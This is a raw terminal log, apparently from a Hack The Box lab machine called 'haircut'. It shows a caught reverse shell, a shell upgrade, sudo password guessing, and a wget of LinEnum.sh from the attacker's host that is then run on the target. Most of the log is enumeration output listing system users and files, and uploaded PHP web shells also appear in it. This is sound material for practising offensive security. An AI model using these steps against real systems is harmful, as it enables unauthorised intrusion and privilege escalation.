┌─[root@parrot]─[~/hackthebox/haircut] 
└──╼ #nc -nvlp 9001                    
Ncat: Version 7.80 ( https://nmap.org/ncat )                                   
Ncat: Listening on :::9001             
Ncat: Listening on 0.0.0.0:9001        
Ncat: Connection from 10.10.10.24.     
Ncat: Connection from 10.10.10.24:57218.                                       
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux                                                      
 17:27:17 up  1:19,  0 users,  load average: 0.00, 0.00, 0.00                  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT            
uid=33(www-data) gid=33(www-data) groups=33(www-data)                          
/bin/sh: 0: can't access tty; job control turned off                           
$ python -c "import pty; pty.spawn('/bin/bash')"                               
/bin/sh: 1: python: not found          
$ python3 -c "import pty ; pty.spawn('/bin/bash')"                             
www-data@haircut:/$ ls                 
ls                                     
bin   home            lib64       opt   sbin  tmp      vmlinuz.old             
boot  initrd.img      lost+found  proc  snap  usr                              
dev   initrd.img.old  media       root  srv   var                              
etc   lib             mnt         run   sys   vmlinuz                          
www-data@haircut:/$ cd home            
cd home                                
www-data@haircut:/home$ ls             
ls                                     
maria                                  
www-data@haircut:/home$ cd maria       
cd maria                               
www-data@haircut:/home/maria$ ls       
ls                                     
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos      
www-data@haircut:/home/maria$ cd Desktop                                       
cd Desktop                             
www-data@haircut:/home/maria/Desktop$ ls                                       
ls                                     
user.txt                               
www-data@haircut:/home/maria/Desktop$ cat user.txt                             
cat user.txt                           
 0b0da2af50e9ab7c81a6ec2c562afeae      
www-data@haircut:/home/maria/Desktop$ sudo -l                                  
sudo -l                                
[sudo] password for www-data: root     

Sorry, try again.                      
[sudo] password for www-data: toor     

Sorry, try again.                      
[sudo] password for www-data: admin    

sudo: 3 incorrect password attempts    
www-data@haircut:/home/maria/Desktop$ ^Z                                       
[1]+  Stopped                 nc -nvlp 9001                                    
┌─[✗]─[root@parrot]─[~/hackthebox/haircut]                                     
└──╼ #stty raw -echo                   
┌─[root@parrot]─[~/hackthebox/haircut] 
└──╼ #nc -nvlp 9001                    

www-data@haircut:/home/maria/Desktop$ ls                                       
user.txt                               
www-data@haircut:/home/maria/Desktop$ cd ..                                    
www-data@haircut:/home/maria$ ls       
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos      
www-data@haircut:/home/maria$ cd Documents                                     
www-data@haircut:/home/maria/Documents$ ls                                     
www-data@haircut:/home/maria/Documents$ ls -la                                 
total 8                                
drwxr-xr-x  2 maria maria 4096 May 16  2017 .                                  
drwxr-xr-x 15 maria maria 4096 May 19  2017 ..                                 
www-data@haircut:/home/maria/Documents$ cd ../                                 
www-data@haircut:/home/maria$          
www-data@haircut:/home/maria$ cd /dev/shm                                      
www-data@haircut:/dev/shm$ wget 10.10.14.14/LinEnum.sh                         
--2020-01-09 17:36:12--  http://10.10.14.14/LinEnum.sh                         
Connecting to 10.10.14.14:80... failed: Connection refused.                    
www-data@haircut:/dev/shm$ wget 10.10.14.14:8000/LinEnum.sh                    
--2020-01-09 17:36:28--  http://10.10.14.14:8000/LinEnum.sh                    
Connecting to 10.10.14.14:8000... connected.                                   
HTTP request sent, awaiting response... 200 OK                                 
Length: 46488 (45K) [text/x-sh]        
Saving to: 'LinEnum.sh'                

LinEnum.sh          100%[===================>]  45.40K  2.65KB/s    in 17s                                                                                     

2020-01-09 17:36:46 (2.73 KB/s) - 'LinEnum.sh' saved [46488/46488]             

www-data@haircut:/dev/shm$ bash LinEnum.sh                                     

#########################################################                      
# Local Linux Enumeration & Privilege Escalation Script #                      
#########################################################                      
# www.rebootuser.com                   
# version 0.981                        

[-] Debug Info                         
[+] Thorough tests = Enabled           


Scan started at:                       
Thu Jan  9 17:37:24 CET 2020           


### SYSTEM ##############################################                      
[-] Kernel information:                
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux                                                      


[-] Kernel information (continued):    
Linux version 4.4.0-78-generic (buildd@lgw01-11) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017     


[-] Specific release information:      
DISTRIB_ID=Ubuntu                      
DISTRIB_RELEASE=16.04                  
DISTRIB_CODENAME=xenial                
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"                                       
NAME="Ubuntu"                          
VERSION="16.04.2 LTS (Xenial Xerus)"   
ID=ubuntu                              
ID_LIKE=debian                         
PRETTY_NAME="Ubuntu 16.04.2 LTS"       
VERSION_ID="16.04"                     
HOME_URL="http://www.ubuntu.com/"      
SUPPORT_URL="http://help.ubuntu.com/"  
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"                             
VERSION_CODENAME=xenial                
UBUNTU_CODENAME=xenial                 


[-] Hostname:                          
haircut                                


### USER/GROUP ##########################################                      
[-] Current user/group info:           
uid=33(www-data) gid=33(www-data) groups=33(www-data)                          


[-] Users that have previously logged onto the system:                         
Username         Port     From             Latest                              
maria            tty1                      Sun Dec 24 17:33:55 +0100 2017      


[-] Who else is logged on:             
 17:37:24 up  1:29,  0 users,  load average: 0.00, 0.00, 0.00                  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT            


[-] Group memberships:                 
uid=0(root) gid=0(root) groups=0(root) 
uid=1(daemon) gid=1(daemon) groups=1(daemon)                                   
uid=2(bin) gid=2(bin) groups=2(bin)    
uid=3(sys) gid=3(sys) groups=3(sys)    
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)                           
uid=5(games) gid=60(games) groups=60(games)                                    
uid=6(man) gid=12(man) groups=12(man)  
uid=7(lp) gid=7(lp) groups=7(lp)       
uid=8(mail) gid=8(mail) groups=8(mail) 
uid=9(news) gid=9(news) groups=9(news) 
uid=10(uucp) gid=10(uucp) groups=10(uucp)                                      
uid=13(proxy) gid=13(proxy) groups=13(proxy)                                   
uid=33(www-data) gid=33(www-data) groups=33(www-data)                          
uid=34(backup) gid=34(backup) groups=34(backup)                                
uid=38(list) gid=38(list) groups=38(list)                                      
uid=39(irc) gid=39(irc) groups=39(irc) 
uid=41(gnats) gid=41(gnats) groups=41(gnats)                                   
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)                     
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)                                                                               
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)  
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)  
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)                                                                            
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)                      
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)                         
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)                          
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)                 
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)                                
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)                      
uid=1000(maria) gid=1000(maria) groups=1000(maria),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                         
uid=110(mysql) gid=117(mysql) groups=117(mysql)                                
uid=111(lightdm) gid=118(lightdm) groups=118(lightdm)                          
uid=112(pulse) gid=121(pulse) groups=121(pulse),29(audio)                      
uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)                         


[-] It looks like we have some admin users:                                    
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)                      
uid=1000(maria) gid=1000(maria) groups=1000(maria),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)                         


[-] Contents of /etc/passwd:           
root:x:0:0:root:/root:/bin/bash        
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                
bin:x:2:2:bin:/bin:/usr/sbin/nologin   
sys:x:3:3:sys:/dev:/usr/sbin/nologin   
sync:x:4:65534:sync:/bin:/bin/sync     
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                   
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                    
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                              
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                            
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                     
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                           
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                           
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                               
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                                                              
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                     
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false                                                                             
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false                                                                          
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false  
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false       
syslog:x:104:108::/home/syslog:/bin/false                                      
_apt:x:105:65534::/nonexistent:/bin/false                                      
lxd:x:106:65534::/var/lib/lxd/:/bin/false                                      
messagebus:x:107:111::/var/run/dbus:/bin/false                                 
uuidd:x:108:112::/run/uuidd:/bin/false 
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false                        
maria:x:1000:1000:maria,,,:/home/maria:/bin/bash                               
mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false                        
lightdm:x:111:118:Light Display Manager:/var/lib/lightdm:/bin/false            
pulse:x:112:121:PulseAudio daemon,,,:/var/run/pulse:/bin/false                 
sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin                              


[-] Super user account(s):             
root                                   


[-] Accounts that have recently used sudo:                                     
/home/maria/.sudo_as_admin_successful  


[-] Are permissions on /home directories lax:                                  
total 12K                              
drwxr-xr-x  3 root  root  4.0K May 15  2017 .                                  
drwxr-xr-x 23 root  root  4.0K May 16  2017 ..                                 
drwxr-xr-x 15 maria maria 4.0K May 19  2017 maria                              


[-] Files owned by our user:           
-rw-rw-rw- 1 www-data www-data 46488 Jan  9 17:34 /dev/shm/LinEnum.sh          
-rw-r--r-- 1 www-data www-data 43 Jan  9 17:19 /var/www/html/uploads/rshell.php                                                                                
-rwxr-xr-x 1 www-data www-data 116637 May 19  2017 /var/www/html/uploads/bounce.jpg                                                                            
-rw-r--r-- 1 www-data www-data 2296 Jan  9 17:26 /var/www/html/uploads/pshell.php                                                                              
-rw-r----- 1 www-data adm 3478149 Jan  9 17:28 /var/log/nginx/access.log       
-rw-r----- 1 www-data adm 8778 May 22  2017 /var/log/nginx/access.log.1        
-rw-r----- 1 www-data adm 1446 Jan  9 17:28 /var/log/nginx/error.log           
-rw-r----- 1 www-data adm 529 May 19  2017 /var/log/nginx/error.log.2.gz       
-rw-r----- 1 www-data adm 186 May 22  2017 /var/log/nginx/error.log.1          
-rw-r----- 1 www-data adm 1493 May 19  2017 /var/log/nginx/access.log.2.gz     


[-] Hidden files:                      
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.d/.placeholder               
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.hourly/.placeholder          
-rw-r--r-- 1 root root 220 Sep  1  2015 /etc/skel/.bash_logout                 
-rw-r--r-- 1 root root 3771 Sep  1  2015 /etc/skel/.bashrc                     
-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile                     
-rw-r--r-- 1 root root 1286 May 22  2017 /etc/init.d/.depend.stop              
-rw-r--r-- 1 root root 1286 May 22  2017 /etc/init.d/.depend.boot              
-rw-r--r-- 1 root root 1291 May 22  2017 /etc/init.d/.depend.start             
-rw-r--r-- 1 root root 1391 May 16  2017 /etc/apparmor.d/cache/.features       
-rw------- 1 root root 0 Feb 15  2017 /etc/.pwd.lock                           
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.weekly/.placeholder          
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.monthly/.placeholder         
-rw-r--r-- 1 root root 102 Apr  5  2016 /etc/cron.daily/.placeholder           
-rw-r--r-- 1 root root 1319 May 16  2017 /var/lib/apparmor/profiles/.apparmor.md5sums                                                                          
-rw-r--r-- 1 maria maria 177 Jan 17  2017 /usr/local/bin/screen/.gitignore     
-rw-r--r-- 1 maria maria 6774 Jan 17  2017 /usr/local/bin/screen/.iscreenrc    
-rw-r--r-- 1 maria maria 22 Jan 17  2017 /usr/local/bin/screen/doc/.gitignore  
-rw-r--r-- 1 root root 2380 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.kallsyms.cmd                                                         
-rw-r--r-- 1 root root 3387 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.recordmcount.cmd                                                     
-rw-r--r-- 1 root root 2391 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.conmakehash.cmd                                                      
-rw-r--r-- 1 root root 4917 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/kconfig/.zconf.tab.o.cmd                                              
-rw-r--r-- 1 root root 3755 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/kconfig/.conf.o.cmd                                                   
-rw-r--r-- 1 root root 110 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/kconfig/.conf.cmd                                                      
-rw-r--r-- 1 root root 3253 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.asn1_compiler.cmd                                                    
-rw-r--r-- 1 root root 2481 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/genksyms/.parse.tab.o.cmd                                             
-rw-r--r-- 1 root root 153 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/genksyms/.genksyms.cmd                                                 
-rw-r--r-- 1 root root 2719 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/genksyms/.genksyms.o.cmd                                              
-rw-r--r-- 1 root root 3347 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/genksyms/.lex.lex.o.cmd                                               
-rw-r--r-- 1 root root 3972 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.insert-sys-cert.cmd                                                  
-rw-r--r-- 1 root root 4495 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.extract-cert.cmd                                                     
-rw-r--r-- 1 root root 2537 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.mk_elfconfig.cmd                                                 
-rw-r--r-- 1 root root 129 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.modpost.cmd                                                       
-rw-r--r-- 1 root root 4451 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.sumversion.o.cmd                                                 
-rw-r--r-- 1 root root 5191 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.devicetable-offsets.s.cmd                                        
-rw-r--r-- 1 root root 4622 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.modpost.o.cmd                                                    
-rw-r--r-- 1 root root 546 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.devicetable-offsets.h.cmd                                         
-rw-r--r-- 1 root root 3485 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.file2alias.o.cmd                                                 
-rw-r--r-- 1 root root 104 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.elfconfig.h.cmd                                                   
-rw-r--r-- 1 root root 2289 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/mod/.empty.o.cmd                                                      
-rw-r--r-- 1 root root 3568 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.sortextable.cmd                                                      
-rw-r--r-- 1 root root 2839 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/selinux/mdp/.mdp.cmd                                                  
-rw-r--r-- 1 root root 3239 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/selinux/genheaders/.genheaders.cmd                                    
-rw-r--r-- 1 root root 5133 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/.sign-file.cmd                                                        
-rw-r--r-- 1 root root 4268 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/basic/.fixdep.cmd                                                     
-rw-r--r-- 1 root root 1193 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/scripts/basic/.bin2c.cmd                                                      
-rw-r--r-- 1 root root 22 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/.19951.d                                                                        
-rw-r--r-- 1 root root 190242 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/.config                                                                     
-rw-r--r-- 1 root root 14210 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/kernel/.bounds.s.cmd                                                         
-rw-r--r-- 1 root root 190366 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/.config.old                                                                 
-rw-r--r-- 1 root root 820 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/.missing-syscalls.d                                                            
-rw-r--r-- 1 root root 9092 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.sha256.o.cmd                                              
-rw-r--r-- 1 root root 3529 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.string.o.cmd                                              
-rw-r--r-- 1 root root 1324 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.entry64.o.cmd                                             
-rw-r--r-- 1 root root 1374 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.setup-x86_64.o.cmd                                        
-rw-r--r-- 1 root root 333 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.purgatory.ro.cmd                                           
-rw-r--r-- 1 root root 3615 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.purgatory.o.cmd                                           
-rw-r--r-- 1 root root 1304 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.stack.o.cmd                                               
-rw-r--r-- 1 root root 155 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd                                      
-rw-r--r-- 1 root root 315 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd                           
-rw-r--r-- 1 root root 340 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd                          
-rw-r--r-- 1 root root 320 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd                           
-rw-r--r-- 1 root root 316 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd                            
-rw-r--r-- 1 root root 320 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd                           
-rw-r--r-- 1 root root 292 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd                              
-rw-r--r-- 1 root root 402 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd                           
-rw-r--r-- 1 root root 292 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd                              
-rw-r--r-- 1 root root 54037 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/kernel/.asm-offsets.s.cmd                                           
-rw-r--r-- 1 root root 146 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/tools/.relocs.cmd                                                     
-rw-r--r-- 1 root root 3342 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/tools/.relocs_common.o.cmd                                           
-rw-r--r-- 1 root root 3362 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/tools/.relocs_64.o.cmd                                               
-rw-r--r-- 1 root root 3362 Apr 27  2017 /usr/src/linux-headers-4.4.0-78-generic/arch/x86/tools/.relocs_32.o.cmd                                               
-rw-r--r-- 1 root root 2380 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.kallsyms.cmd                                                         
-rw-r--r-- 1 root root 3387 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.recordmcount.cmd                                                     
-rw-r--r-- 1 root root 2391 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.conmakehash.cmd                                                      
-rw-r--r-- 1 root root 4917 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/kconfig/.zconf.tab.o.cmd                                              
-rw-r--r-- 1 root root 3755 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/kconfig/.conf.o.cmd                                                   
-rw-r--r-- 1 root root 110 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/kconfig/.conf.cmd                                                      
-rw-r--r-- 1 root root 3253 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.asn1_compiler.cmd                                                    
-rw-r--r-- 1 root root 2481 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/genksyms/.parse.tab.o.cmd                                             
-rw-r--r-- 1 root root 153 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/genksyms/.genksyms.cmd                                                 
-rw-r--r-- 1 root root 2719 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/genksyms/.genksyms.o.cmd                                              
-rw-r--r-- 1 root root 3347 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/genksyms/.lex.lex.o.cmd                                               
-rw-r--r-- 1 root root 3972 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.insert-sys-cert.cmd                                                  
-rw-r--r-- 1 root root 4495 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.extract-cert.cmd                                                     
-rw-r--r-- 1 root root 2537 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.mk_elfconfig.cmd                                                 
-rw-r--r-- 1 root root 129 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.modpost.cmd                                                       
-rw-r--r-- 1 root root 4451 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.sumversion.o.cmd                                                 
-rw-r--r-- 1 root root 5191 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.devicetable-offsets.s.cmd                                        
-rw-r--r-- 1 root root 4622 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.modpost.o.cmd                                                    
-rw-r--r-- 1 root root 546 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.devicetable-offsets.h.cmd                                         
-rw-r--r-- 1 root root 3485 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.file2alias.o.cmd                                                 
-rw-r--r-- 1 root root 104 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.elfconfig.h.cmd                                                   
-rw-r--r-- 1 root root 2289 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/mod/.empty.o.cmd                                                      
-rw-r--r-- 1 root root 3568 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.sortextable.cmd                                                      
-rw-r--r-- 1 root root 2839 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/selinux/mdp/.mdp.cmd                                                  
-rw-r--r-- 1 root root 3239 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/selinux/genheaders/.genheaders.cmd                                    
-rw-r--r-- 1 root root 5133 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/.sign-file.cmd                                                        
-rw-r--r-- 1 root root 4268 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/basic/.fixdep.cmd                                                     
-rw-r--r-- 1 root root 1193 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/scripts/basic/.bin2c.cmd                                                      
-rw-r--r-- 1 root root 22 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/.19514.d                                                                        
-rw-r--r-- 1 root root 190242 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/.config                                                                     
-rw-r--r-- 1 root root 14210 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/kernel/.bounds.s.cmd                                                         
-rw-r--r-- 1 root root 190366 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/.config.old                                                                 
-rw-r--r-- 1 root root 820 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/.missing-syscalls.d                                                            
-rw-r--r-- 1 root root 9092 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.sha256.o.cmd                                              
-rw-r--r-- 1 root root 3529 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.string.o.cmd                                              
-rw-r--r-- 1 root root 1324 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.entry64.o.cmd                                             
-rw-r--r-- 1 root root 1374 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.setup-x86_64.o.cmd                                        
-rw-r--r-- 1 root root 333 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.purgatory.ro.cmd                                           
-rw-r--r-- 1 root root 3615 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.purgatory.o.cmd                                           
-rw-r--r-- 1 root root 1304 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.stack.o.cmd                                               
-rw-r--r-- 1 root root 155 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd                                      
-rw-r--r-- 1 root root 315 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/uapi/asm/.unistd_32.h.cmd                           
-rw-r--r-- 1 root root 340 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/uapi/asm/.unistd_x32.h.cmd                          
-rw-r--r-- 1 root root 320 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/uapi/asm/.unistd_64.h.cmd                           
-rw-r--r-- 1 root root 316 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/asm/.unistd_64_x32.h.cmd                            
-rw-r--r-- 1 root root 320 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/asm/.unistd_32_ia32.h.cmd                           
-rw-r--r-- 1 root root 292 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd                              
-rw-r--r-- 1 root root 402 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/asm/.xen-hypercalls.h.cmd                           
-rw-r--r-- 1 root root 292 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/include/generated/asm/.syscalls_32.h.cmd                              
-rw-r--r-- 1 root root 54037 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/kernel/.asm-offsets.s.cmd                                           
-rw-r--r-- 1 root root 146 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/tools/.relocs.cmd                                                     
-rw-r--r-- 1 root root 3342 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/tools/.relocs_common.o.cmd                                           
-rw-r--r-- 1 root root 3362 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/tools/.relocs_64.o.cmd                                               
-rw-r--r-- 1 root root 3362 Apr 26  2017 /usr/src/linux-headers-4.4.0-77-generic/arch/x86/tools/.relocs_32.o.cmd                                               
-rw-r--r-- 1 root root 54 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/dtc/.gitignore                                                                  
-rw-r--r-- 1 root root 31 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/kconfig/lxdialog/.gitignore                                                     
-rw-r--r-- 1 root root 167 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/kconfig/.gitignore                                                             
-rw-r--r-- 1 root root 154 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/.gitignore                                                                     
-rw-r--r-- 1 root root 42 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/genksyms/.gitignore                                                             
-rw-r--r-- 1 root root 12 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/gdb/linux/.gitignore                                                            
-rw-r--r-- 1 root root 55 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/mod/.gitignore                                                                  
-rw-r--r-- 1 root root 21 Jan 11  2016 /usr/src/linux-headers-4.4.0-77/scripts/selinux/mdp/.gitignore                                                          
